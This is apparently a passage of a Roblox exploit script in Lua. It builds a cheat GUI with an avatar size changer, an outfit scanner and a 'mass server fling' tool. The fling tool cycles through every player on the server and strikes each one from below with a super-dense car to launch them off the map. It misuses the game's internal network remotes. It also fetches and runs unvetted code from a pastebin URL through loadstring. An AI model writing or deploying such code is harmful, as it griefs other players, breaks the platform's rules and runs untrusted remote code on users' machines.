ScalerContent.BackgroundTransparency = 1
ScalerContent.Visible = false
ScalerContent.Parent = ScalerFrame

-- 1. Height
local HeightLabel = Instance.new("TextLabel")
HeightLabel.Size = UDim2.new(0, 60, 0, 20)
HeightLabel.Position = UDim2.new(0, 5, 0, 5)
HeightLabel.Text = "Height:"
HeightLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightLabel.Font = Enum.Font.SourceSansBold
HeightLabel.TextSize = 13
HeightLabel.BackgroundTransparency = 1
HeightLabel.Parent = ScalerContent

local HeightInput = Instance.new("TextBox")
HeightInput.Size = UDim2.new(0.3, -20, 0, 20)
HeightInput.Position = UDim2.new(0, 65, 0, 5)
HeightInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeightInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightInput.Font = Enum.Font.Code
HeightInput.TextSize = 13
HeightInput.Text = "1"
HeightInput.Parent = ScalerContent

-- 2. Width
local WidthLabel = Instance.new("TextLabel")
WidthLabel.Size = UDim2.new(0, 60, 0, 20)
WidthLabel.Position = UDim2.new(0, 5, 0, 30)
WidthLabel.Text = "Width:"
WidthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthLabel.Font = Enum.Font.SourceSansBold
WidthLabel.TextSize = 13
WidthLabel.BackgroundTransparency = 1
WidthLabel.Parent = ScalerContent

local WidthInput = Instance.new("TextBox")
WidthInput.Size = UDim2.new(0.3, -20, 0, 20)
WidthInput.Position = UDim2.new(0, 65, 0, 30)
WidthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
WidthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthInput.Font = Enum.Font.Code
WidthInput.TextSize = 13
WidthInput.Text = "1"
WidthInput.Parent = ScalerContent

-- 3. Depth
local DepthLabel = Instance.new("TextLabel")
DepthLabel.Size = UDim2.new(0, 60, 0, 20)
DepthLabel.Position = UDim2.new(0, 5, 0, 55)
DepthLabel.Text = "Depth:"
DepthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthLabel.Font = Enum.Font.SourceSansBold
DepthLabel.TextSize = 13
DepthLabel.BackgroundTransparency = 1
DepthLabel.Parent = ScalerContent

local DepthInput = Instance.new("TextBox")
DepthInput.Size = UDim2.new(0.3, -20, 0, 20)
DepthInput.Position = UDim2.new(0, 65, 0, 55)
DepthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
DepthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthInput.Font = Enum.Font.Code
DepthInput.TextSize = 13
DepthInput.Text = "1"
DepthInput.Parent = ScalerContent

-- 4. Head
local HeadLabel = Instance.new("TextLabel")
HeadLabel.Size = UDim2.new(0, 60, 0, 20)
HeadLabel.Position = UDim2.new(0, 5, 0, 80)
HeadLabel.Text = "Head:"
HeadLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadLabel.Font = Enum.Font.SourceSansBold
HeadLabel.TextSize = 13
HeadLabel.BackgroundTransparency = 1
HeadLabel.Parent = ScalerContent

local HeadInput = Instance.new("TextBox")
HeadInput.Size = UDim2.new(0.3, -20, 0, 20)
HeadInput.Position = UDim2.new(0, 65, 0, 80)
HeadInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeadInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadInput.Font = Enum.Font.Code
HeadInput.TextSize = 13
HeadInput.Text = "1"
HeadInput.Parent = ScalerContent

-- 5. BodyType
local BodyTypeLabel = Instance.new("TextLabel")
BodyTypeLabel.Size = UDim2.new(0, 60, 0, 20)
BodyTypeLabel.Position = UDim2.new(0, 5, 0, 105)
BodyTypeLabel.Text = "BodyType:"
BodyTypeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeLabel.Font = Enum.Font.SourceSansBold
BodyTypeLabel.TextSize = 13
BodyTypeLabel.BackgroundTransparency = 1
BodyTypeLabel.Parent = ScalerContent

local BodyTypeInput = Instance.new("TextBox")
BodyTypeInput.Size = UDim2.new(0.3, -20, 0, 20)
BodyTypeInput.Position = UDim2.new(0, 65, 0, 105)
BodyTypeInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
BodyTypeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeInput.Font = Enum.Font.Code
BodyTypeInput.TextSize = 13
BodyTypeInput.Text = "0"
BodyTypeInput.Parent = ScalerContent

local ApplyScaleBtn = Instance.new("TextButton")
ApplyScaleBtn.Size = UDim2.new(0.4, 0, 0, 120) 
ApplyScaleBtn.Position = UDim2.new(0.6, -5, 0, 5)
ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
ApplyScaleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ApplyScaleBtn.Font = Enum.Font.SourceSansBold
ApplyScaleBtn.TextSize = 14
ApplyScaleBtn.Text = "Apply Sizes"
ApplyScaleBtn.BorderSizePixel = 0
ApplyScaleBtn.Parent = ScalerContent

-- Dropdown Toggle Logic
local scalerExpanded = false
ScalerToggleBtn.MouseButton1Click:Connect(function()
    scalerExpanded = not scalerExpanded
    if scalerExpanded then
        ScalerFrame.Size = UDim2.new(1, -5, 0, 165)
        ScalerContent.Visible = true
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▲ ]"
    else
        ScalerFrame.Size = UDim2.new(1, -5, 0, 30)
        ScalerContent.Visible = false
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
    end
end)

-- Apply Button Logic
ApplyScaleBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local success, description = pcall(function() return humanoid:GetAppliedDescription() end)
    if not success or not description then return end

    ApplyScaleBtn.Text = "Scanning..."
    
    local outfitData = {}
    local function getVal(prop)
        local ok, val = pcall(function() return description[prop] end)
        return (ok and val ~= nil) and val or nil
    end

    local hc = getVal("HeadColor")
    if typeof(hc) == "Color3" then outfitData.SkinTone = {hc.R, hc.G, hc.B} end

    local props = {"Face", "Shirt", "Pants", "GraphicTShirt", "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "IdleAnimation", "WalkAnimation", "RunAnimation", "JumpAnimation", "FallAnimation", "ClimbAnimation", "SwimAnimation", "ProportionScale"}
    for _, p in ipairs(props) do outfitData[p] = getVal(p) end

    outfitData.Accessories = {}
    pcall(function()
        local accs = description:GetAccessories(true)
        if accs then
            for _, a in pairs(accs) do
                table.insert(outfitData.Accessories, {
                    AssetId = a.AssetId,
                    IsLayered = a.IsLayered,
                    AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
                })
            end
        end
    end)

    -- INJECT ALL CUSTOM SIZES
    outfitData.HeightScale = tonumber(HeightInput.Text) or 1
    outfitData.WidthScale = tonumber(WidthInput.Text) or 1
    outfitData.DepthScale = tonumber(DepthInput.Text) or 1
    outfitData.HeadScale = tonumber(HeadInput.Text) or 1
    outfitData.BodyTypeScale = tonumber(BodyTypeInput.Text) or 0

    local payload = buildBatchPayload(outfitData)
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)

    if not Send then
        ApplyScaleBtn.Text = "Loading Net..."
        pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))() end)
        task.wait(1)
        Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    end

    if Send then
        ApplyScaleBtn.Text = "Applying..."
        task.spawn(function()
            for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
            task.wait(0.2)
            
            if outfitData.SkinTone then 
                pcall(function() 
                    local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3]) 
                    for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end 
                end) 
            end
            
            for i=1,3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "DepthScale", outfitData.DepthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "HeadScale", outfitData.HeadScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.05) end
            if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.05) end end

            ApplyScaleBtn.Text = "Size Applied!"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
            task.wait(1.5)
            ApplyScaleBtn.Text = "Apply Sizes"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        end)
    else
        ApplyScaleBtn.Text = "Net Error"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        ApplyScaleBtn.Text = "Apply Sizes"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
    end
end)
------
-- ========== MASS SERVER FLING (Underground Uppercut + Auto-Respawn & Stack Logs) ==========
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local isMassFlinging = false
local massFlingLoop = nil
local targetCycler = nil
local massFlingTarget = nil
local massWhitelist = {}
local originalCarProps = {}

-- Main Container (Adjusted to fit Status Console)
local MassFlingFrame = Instance.new("Frame")
MassFlingFrame.Size = UDim2.new(1, -5, 0, 165)
MassFlingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
MassFlingFrame.BorderSizePixel = 0
MassFlingFrame.ClipsDescendants = true
MassFlingFrame.Parent = ToolsScroll

local MassFlingTitle = Instance.new("TextLabel")
MassFlingTitle.Size = UDim2.new(1, -10, 0, 20)
MassFlingTitle.Position = UDim2.new(0, 5, 0, 5)
MassFlingTitle.Text = "🚗 Autonomous Server Strike"
MassFlingTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
MassFlingTitle.Font = Enum.Font.SourceSansBold
MassFlingTitle.TextSize = 14
MassFlingTitle.TextXAlignment = Enum.TextXAlignment.Left
MassFlingTitle.BackgroundTransparency = 1
MassFlingTitle.Parent = MassFlingFrame

local MassFlingBtn = Instance.new("TextButton")
MassFlingBtn.Size = UDim2.new(1, -10, 0, 35)
MassFlingBtn.Position = UDim2.new(0, 5, 0, 25)
MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
MassFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MassFlingBtn.Font = Enum.Font.SourceSansBold
MassFlingBtn.TextSize = 16
MassFlingBtn.Text = "START SERVER FLING"
MassFlingBtn.BorderSizePixel = 0
MassFlingBtn.Parent = MassFlingFrame

-- Stacking Status Log Console
local StatusScroll = Instance.new("ScrollingFrame")
StatusScroll.Size = UDim2.new(1, -10, 0, 60)
StatusScroll.Position = UDim2.new(0, 5, 0, 65)
StatusScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
StatusScroll.BorderSizePixel = 0
StatusScroll.ScrollBarThickness = 3
StatusScroll.Parent = MassFlingFrame

local StatusLayout = Instance.new("UIListLayout")
StatusLayout.SortOrder = Enum.SortOrder.LayoutOrder
StatusLayout.Padding = UDim.new(0, 2)
StatusLayout.Parent = StatusScroll

StatusLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    StatusScroll.CanvasSize = UDim2.new(0, 0, 0, StatusLayout.AbsoluteContentSize.Y)
    StatusScroll.CanvasPosition = Vector2.new(0, StatusLayout.AbsoluteContentSize.Y) -- Auto-scroll down
end)

local statusOrder = 0
local function updateStatus(text, color, clearLogs)
    if clearLogs then
        for _, child in ipairs(StatusScroll:GetChildren()) do
            if child:IsA("TextLabel") then child:Destroy() end
        end
        statusOrder = 0
    end
    
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -5, 0, 15)
    msg.BackgroundTransparency = 1
    msg.Text = " " .. text
    msg.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    msg.Font = Enum.Font.Code
    msg.TextSize = 11
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.LayoutOrder = statusOrder
    msg.Parent = StatusScroll
    
    statusOrder = statusOrder + 1
end



local function getMyVehicle()
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end
    for _, v in pairs(vehiclesFolder:GetChildren()) do
        local ownerObj = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)
        if ownerObj and ownerObj.Value == LocalPlayer then return v end
    end
    return nil
end

local function stopMassFling()
    isMassFlinging = false
    massFlingTarget = nil
    updateStatus("🛑 Attack sequence stopped.", Color3.fromRGB(200, 50, 50), false)
    
    if massFlingLoop then massFlingLoop:Disconnect(); massFlingLoop = nil end
    if targetCycler then task.cancel(targetCycler); targetCycler = nil end
    
    -- Restore original physics
    for part, props in pairs(originalCarProps) do
        if part and part.Parent then part.CustomPhysicalProperties = props end
    end
    table.clear(originalCarProps)
    
    local car = getMyVehicle()
    if car then
        local base = car.PrimaryPart or car:FindFirstChild("Base")
        if base then
            base.Velocity = Vector3.zero
            base.RotVelocity = Vector3.zero
        end
    end
end

local function startMassFling()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum or not hum.SeatPart then return false end 
    
    local car = getMyVehicle()
    local base = car and (car.PrimaryPart or car:FindFirstChild("Base") or hum.SeatPart)
    if not base then return false end
    
    local lastVehicleName = car.Name

    isMassFlinging = true
    local isRespawningVehicle = false
    table.clear(originalCarProps)

    -- Force max density
    for _, part in ipairs(car:GetDescendants()) do
        if part:IsA("BasePart") then
            originalCarProps[part] = part.CustomPhysicalProperties
            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            part.CanCollide = true
        end
    end
    
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")

    -- 1. LOOPING CYCLER (Fast & Checks every user)
    targetCycler = task.spawn(function()
        while isMassFlinging do
            local playerList = Players:GetPlayers()
            -- Automatically clears logs on every new sweep
            updateStatus("🔄 Sweeping Server (" .. #playerList .. " players)...", Color3.fromRGB(100, 150, 255), true)
            
            for _, plr in ipairs(playerList) do
                if not isMassFlinging then break end
                if plr == LocalPlayer or massWhitelist[plr.Name] then continue end
                
                -- Wait if car is currently respawning
                while isRespawningVehicle do task.wait(0.2) end
                
                local tChar = plr.Character
                local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                local tHum = tChar and tChar:FindFirstChildOfClass("Humanoid")
                
                -- Dead or no character
                if not tChar or not tRoot or not tHum then 
                    updateStatus("⏩ Skipped " .. plr.Name .. " (No Char)", Color3.fromRGB(120, 120, 120))
                    continue 
                end
                
                -- Void or Sky
                if tRoot.Position.Y < -40 or tRoot.Position.Y > 400 then
                    updateStatus("⏩ Skipped " .. plr.Name .. " (Void/Sky)", Color3.fromRGB(120, 120, 120))
                    continue
                end
                
                -- Sitting Logic (Ignore normal chairs, attack vehicles)
                if tHum.Sit and tHum.SeatPart then
                    local isSittingInCar = false
                    local vehicleAncestor = tHum.SeatPart:FindFirstAncestorOfClass("Model")
                    if vehiclesFolder and vehicleAncestor and vehicleAncestor:IsDescendantOf(vehiclesFolder) then
                        isSittingInCar = true
                    end
                    
                    if not isSittingInCar then
                        updateStatus("🪑 Skipped " .. plr.Name .. " (In Chair)", Color3.fromRGB(200, 150, 50))
                        continue
                    end
                end

                -- Lock onto target
                massFlingTarget = plr
                updateStatus("🎯 Targeting: " .. plr.Name, Color3.fromRGB(200, 200, 50))
                
                local ticks = 0
                local wasFlung = false
                
                -- Bomb them fast (max ~0.3 seconds before giving up)
                while isMassFlinging and massFlingTarget == plr and ticks < 10 do
                    task.wait(0.03) 
                    ticks = ticks + 1
                    
                    local currentRoot = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                    -- Stop hitting if they fall out of bounds or their velocity spikes heavily
                    if not currentRoot or currentRoot.Velocity.Magnitude > 300 or currentRoot.Position.Y < -40 or currentRoot.Position.Y > 400 then
                        wasFlung = true
                        break 
                    end
                end
                
                if wasFlung then
                    updateStatus("💥 Flung: " .. plr.Name, Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("⚠️ Timeout: " .. plr.Name, Color3.fromRGB(200, 100, 100))
                end
            end
            
            updateStatus("⏳ List finished. Restarting...", Color3.fromRGB(100, 150, 255))
            task.wait(0.5) 
        end
    end)

    -- 2. DESYNC, AUTO-REMOUNT, AND AUTO-RESPAWN
    massFlingLoop = RunService.Heartbeat:Connect(function()
        if not isMassFlinging then return end
        if isRespawningVehicle then return end
        
            -- AUTO-RESPAWN: If car gets sent to the void or despawns
        if not car or not car.Parent or not base or not base.Parent then
            isRespawningVehicle = true
            task.spawn(function()
                updateStatus("⚠️ Car Lost! Respawning " .. lastVehicleName .. "...", Color3.fromRGB(255, 120, 50))
                
                -- Foolproof Flames Hub Net Fetcher
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("spawn_vehicle", lastVehicleName)
                    elseif g.Get then
                        g.Get("spawn_vehicle", lastVehicleName)
                    end
                end)
                
                task.wait(2.5) -- Wait for network to drop the vehicle
                
                car = getMyVehicle()
                if car then
                    base = car.PrimaryPart or car:FindFirstChild("Base")
                    -- Re-apply max density
                    for _, part in ipairs(car:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
                            part.CanCollide = true
                        end
                    end
                    updateStatus("✅ Car Respawned. Remounting...", Color3.fromRGB(50, 200, 100))
                else
                    updateStatus("❌ Failed to respawn vehicle.", Color3.fromRGB(255, 50, 50))
                end
                isRespawningVehicle = false
            end)
            return
        end

        -- AUTO-REMOUNT: If you get detached from the seat
        if hum and not hum.SeatPart then
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            local vehicleSeat = car:FindFirstChildOfClass("VehicleSeat") or car:FindFirstChildWhichIsA("Seat", true)
            
            if myRoot and vehicleSeat then
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
                
                -- Teleport directly above the seat cushion
                myRoot.CFrame = vehicleSeat.CFrame * CFrame.new(0, 1.5, 0)
                
                -- Force sit via Roblox API
                vehicleSeat:Sit(hum)
                
                -- Force sit via Flames Hub native remote
                pcall(function()
                    local g = getgenv()
                    local Net = g.Net
                    if not Net then
                        local core = game:GetService("ReplicatedStorage"):FindFirstChild("Core", true)
                        if core and core:FindFirstChild("Net") then Net = require(core.Net) end
                    end
                    if Net and type(Net.get) == "function" then
                        Net.get("sit", vehicleSeat)
                    elseif g.Get then
                        g.Get("sit", vehicleSeat)
                    end
                end)
            end
            return -- Skip attack phase while trying to sit
        end

        local tRoot = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChild("HumanoidRootPart")
        local tHum = massFlingTarget and massFlingTarget.Character and massFlingTarget.Character:FindFirstChildOfClass("Humanoid")
        
        local strikeTarget = tRoot
        if tHum and tHum.Sit and tHum.SeatPart then
            strikeTarget = tHum.SeatPart
        end
        
        if strikeTarget then
            -- THE SAFE ZONE: Hidden 45 studs directly beneath the target (deep enough to bypass water)
            local undergroundPos = strikeTarget.CFrame * CFrame.new(0, -45, 0)
            
            -- THE STRIKE ZONE: Placed directly onto them from beneath
            local strikePos = strikeTarget.CFrame * CFrame.new(0, -1.5, 0)
            
            -- Teleport to strike zone and launch UPWARD
            base.CFrame = strikePos
            base.Velocity = Vector3.new(math.random(-50000, 50000), 50000, math.random(-50000, 50000)) 
            base.RotVelocity = Vector3.new(50000, 50000, 50000)
            
            RunService.RenderStepped:Wait()
            
            if base and not isRespawningVehicle then
                base.CFrame = undergroundPos
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        else
            local myRoot = char:FindFirstChild("HumanoidRootPart")
            if myRoot then
                base.CFrame = myRoot.CFrame * CFrame.new(0, -45, 0)
                base.Velocity = Vector3.zero
                base.RotVelocity = Vector3.zero
            end
        end
    end)
    
    return true
end

MassFlingBtn.MouseButton1Click:Connect(function()
    if isMassFlinging then
        MassFlingBtn.Text = "START SERVER FLING"
        MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        stopMassFling()
    else
        local success = startMassFling()
        if success then
            MassFlingBtn.Text = "STOP SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        else
            MassFlingBtn.Text = "⚠️ SIT IN DRIVER SEAT FIRST"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
            task.wait(1.5)
            MassFlingBtn.Text = "START SERVER FLING"
            MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
        end
    end
end)




-- Resize Handle (Bottom Right Corner)
local ResizeHandle = Instance.new("TextButton")
ResizeHandle.Name = "ResizeHandle"
ResizeHandle.Size = UDim2.new(0, 15, 0, 15)
ResizeHandle.Position = UDim2.new(1, -15, 1, -15)
ResizeHandle.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
ResizeHandle.Text = "↘"
ResizeHandle.TextColor3 = Color3.fromRGB(15, 15, 18)
ResizeHandle.Font = Enum.Font.SourceSansBold
ResizeHandle.TextSize = 14
ResizeHandle.BorderSizePixel = 0
ResizeHandle.ZIndex = 10
ResizeHandle.Parent = MainFrame

-- Resizing Logic
local isResizing = false
local dragStart
local startSize
local minWidth = 320
local minHeight = 250

ResizeHandle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = true
        dragStart = input.Position
        startSize = MainFrame.AbsoluteSize
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        local newWidth = math.max(minWidth, startSize.X + delta.X)
        local newHeight = math.max(minHeight, startSize.Y + delta.Y)
        MainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = false
    end
end)

-- Window Controls Logic
local minimized = false
local savedSize = MainFrame.Size

MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        savedSize = MainFrame.Size 
        MainFrame.Size = UDim2.new(0, MainFrame.AbsoluteSize.X, 0, 35)
        ResizeHandle.Visible = false
    else
        MainFrame.Size = savedSize 
        ResizeHandle.Visible = true
    end
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- We need to forward-declare the populate function so the button can call it
local populateSavedOutfits

BackBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    SavedScroll.Visible = false
    ToolsScroll.Visible = false
    PlayerScroll.Visible = true
    
    BackBtn.Visible = false
    RefreshBtn.Visible = true
    SavedTabBtn.Visible = true
    ToolsTabBtn.Visible = true
    Title.Text = "🧬 Deep Live Outfit Scanner"
end)

SavedTabBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    PlayerScroll.Visible = false
    ToolsScroll.Visible = false
    SavedScroll.Visible = true
    
    BackBtn.Visible = true
    RefreshBtn.Visible = false
    SavedTabBtn.Visible = false
    ToolsTabBtn.Visible = false
    Title.Text = "📁 Saved Outfits"
    if populateSavedOutfits then populateSavedOutfits() end
end)

ToolsTabBtn.MouseButton1Click:Connect(function()
    AssetScroll.Visible = false
    PlayerScroll.Visible = false
    SavedScroll.Visible = false
    ToolsScroll.Visible = true
    
    BackBtn.Visible = true
    RefreshBtn.Visible = false
    SavedTabBtn.Visible = false
    ToolsTabBtn.Visible = false
    Title.Text = "🛠️ Utility Tools"
end)


local function createDetailedAssetCard(categoryName, assetId, rawPropertySource)
    local numericId = tonumber(assetId)
    if not numericId then return end

    local CardFrame = Instance.new("Frame")
    CardFrame.Size = UDim2.new(1, -5, 0, 105)
    CardFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    CardFrame.BorderSizePixel = 0
    CardFrame.LayoutOrder = 5
    CardFrame.Parent = AssetScroll

    local PreviewImg = Instance.new("ImageLabel")
    PreviewImg.Size = UDim2.new(0, 95, 0, 95)
    PreviewImg.Position = UDim2.new(0, 5, 0, 5)
    PreviewImg.BackgroundColor3 = Color3.fromRGB(12, 12, 15)
    PreviewImg.Image = "rbxthumb://type=Asset&id=" .. tostring(numericId) .. "&w=150&h=150"
    PreviewImg.Parent = CardFrame

    local CategoryLabel = Instance.new("TextLabel")
    CategoryLabel.Size = UDim2.new(1, -115, 0, 15)
    CategoryLabel.Position = UDim2.new(0, 110, 0, 6)
    CategoryLabel.Text = "[" .. categoryName:upper() .. "]"
    CategoryLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
    CategoryLabel.Font = Enum.Font.SourceSansBold
    CategoryLabel.TextSize = 13
    CategoryLabel.TextXAlignment = Enum.TextXAlignment.Left
    CategoryLabel.BackgroundTransparency = 1
    CategoryLabel.Parent = CardFrame

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(1, -115, 0, 18)
    NameLabel.Position = UDim2.new(0, 110, 0, 22)
    NameLabel.Text = "Querying item database..."
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.SourceSans
    NameLabel.TextSize = 14
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.BackgroundTransparency = 1
    NameLabel.Parent = CardFrame

    local CreatorLabel = Instance.new("TextLabel")
    CreatorLabel.Size = UDim2.new(1, -155, 0, 15)
    CreatorLabel.Position = UDim2.new(0, 110, 0, 42)
    CreatorLabel.Text = "Creator: Fetching..."
    CreatorLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
    CreatorLabel.Font = Enum.Font.SourceSansItalic
    CreatorLabel.TextSize = 12
    CreatorLabel.TextXAlignment = Enum.TextXAlignment.Left
    CreatorLabel.BackgroundTransparency = 1
    CreatorLabel.Parent = CardFrame

    local CreatorIcon = Instance.new("ImageLabel")
    CreatorIcon.Size = UDim2.new(0, 28, 0, 28)
    CreatorIcon.Position = UDim2.new(1, -40, 0, 38)
    CreatorIcon.BackgroundTransparency = 1
    CreatorIcon.Parent = CardFrame

    local SourceLabel = Instance.new("TextLabel")
    SourceLabel.Size = UDim2.new(1, -115, 0, 15)
    SourceLabel.Position = UDim2.new(0, 110, 0, 58)
    SourceLabel.Text = "Source: " .. rawPropertySource
    SourceLabel.TextColor3 = Color3.fromRGB(255, 180, 0)
    SourceLabel.Font = Enum.Font.Code
    SourceLabel.TextSize = 11
    SourceLabel.TextXAlignment = Enum.TextXAlignment.Left
    SourceLabel.BackgroundTransparency = 1
    SourceLabel.Parent = CardFrame

    local IdBox = Instance.new("TextBox")
    IdBox.Size = UDim2.new(1, -115, 0, 22)
    IdBox.Position = UDim2.new(0, 110, 0, 76)
    IdBox.Text = tostring(numericId)
    IdBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    IdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    IdBox.Font = Enum.Font.Code
    IdBox.TextSize = 12
    IdBox.ClearTextOnFocus = false
    IdBox.TextEditable = true
    IdBox.Parent = CardFrame

    task.spawn(function()
        local success, info = pcall(function()
            return MarketplaceService:GetProductInfo(numericId, Enum.InfoType.Asset)
        end)
        
        if not success or not info or info.Name == "" then
            pcall(function()
                local collection = InsertService:GetInboundExtensionIds(numericId)
                if collection and #collection > 0 then
                    local alternativeId = collection[1]
                    local altSuccess, altInfo = pcall(function()
                        return MarketplaceService:GetProductInfo(alternativeId, Enum.InfoType.Asset)
                    end)
                    if altSuccess and altInfo then info = altInfo success = true end
                end
            end)
        end

        if success and info then
            NameLabel.Text = info.Name ~= "" and info.Name or "Unnamed Asset Component"
            CreatorLabel.Text = "By: " .. (info.Creator and info.Creator.Name or "Roblox")
            if info.Creator and info.Creator.Id and type(info.Creator.Id) == "number" then
                local ok, thumb = pcall(function()
                    return Players:GetUserThumbnailAsync(info.Creator.Id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                end)
                if ok and thumb then
                    CreatorIcon.Image = thumb
                end
            end
        else
            NameLabel.Text = "Layered Mesh Component"
            CreatorLabel.Text = "Creator: Engine Hidden"
        end
    end)
end

-- Scan Logic (Now accepts frozen snapshot data)
local function deepScanPlayerOutfit(targetPlayer, cachedDescription)
    for _, child in pairs(AssetScroll:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    
    Title.Text = "🧬 Scanning: " .. targetPlayer.DisplayName
    PlayerScroll.Visible = false
    AssetScroll.Visible = true
    RefreshBtn.Visible = false
    BackBtn.Visible = true

    -- Use the frozen snapshot. If they weren't loaded during refresh, fallback to live.
    local description = cachedDescription
    if not description then
        local liveChar = targetPlayer.Character or Workspace:FindFirstChild(targetPlayer.Name)
        local humanoid = liveChar and liveChar:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function() description = humanoid:GetAppliedDescription() end)
        end
    end

    if not description then return end -- Abort if no data could be found

    local avatarFrame = Instance.new("Frame")
    avatarFrame.Size = UDim2.new(1, -5, 0, 250)
    avatarFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    avatarFrame.BorderSizePixel = 1
    avatarFrame.BorderColor3 = Color3.fromRGB(0, 255, 150)
    avatarFrame.LayoutOrder = 1
